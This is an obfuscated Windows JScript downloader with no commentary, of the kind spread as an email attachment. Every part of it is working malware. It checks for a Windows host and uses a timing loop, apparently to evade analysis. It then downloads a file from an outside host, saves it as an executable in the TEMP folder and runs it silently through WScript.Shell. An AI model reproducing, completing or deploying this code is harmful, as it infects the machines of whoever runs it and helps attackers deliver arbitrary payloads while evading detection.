var eF = false;
var e = "CreateObject";
var gL = function S() {return WScript[e]("WScript.Shell");}(), a1 = 11;
var MT = "MSXML2.XMLHTTP";
var F = 2123213;
var l = 0;
function TX(O){gL["Run"](O, l, l);};
function uO(){return "" + MT;};
function Z(zH, n){l = l * 1; return zH - n;};
function M(){return e;};
/*@cc_on
  @if (@_win32 || @_win64)
    eF = true;
  @end
@*/
if (eF)
{
var Bl = "";
function UJ(){return 22;};
var Py = 0; var aB = 0;
function aH()
{
var lg = new this["Date"]();
var gA = lg["getUTCMilliseconds"]();
WScript["Sleep"](UJ());
var lg = new this["Date"]();
var kC = lg["getUTCMilliseconds"]();
WScript["Sleep"](UJ());
var lg = new this["Date"]();
var oV = lg["getUTCMilliseconds"]();
var Py = "H";
Py = Z(kC, gA);
var aB = "x";
aB = Z(oV, kC);
Bl = "open";
return Z(Py, aB);
}
var Ho = false;
var uL = false;
for (var U = l; U < UJ() * 1; U++){if (aH() != l){
Ho = true; 
aB = "31" + 11 * Py + aB; 
uL = true; 
break;
}}
function a() {return ((Ho == true) && (Ho == uL)) ? 1 : l;};
if (Ho && a() && uL){
function fX() {return gL["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "qTDRPnJMiQ.exe";};
 AR = uO();
 i0 = WScript[e](AR);
 var i = 1;
 while (i){
try {
i0[Bl]("GET", "http://dealingdeuces.com/o4pskd", false);
i0["send"]();
z = "Sleep";
for (;;){WScript[z](UJ() * 11); if (i0["readystate"] >= 2 * 2) break;};
i = l;
} catch(iX){};
}
function R(hu) {var Rt = (1, 2, 3, 4, 5, hu); return Rt;};
l0 = WScript[M()]("ADODB.Stream");
AR = l0;
AR[Bl]();
AR["type"] = R(1);
AR["write"](i0["ResponseBody"]);
l0["position"] = R(l);
AR["Save" + "ToFile"](fX(), 2);
l0["c"+"lose"]();
a0 = fX();
TX(a0);
}
}

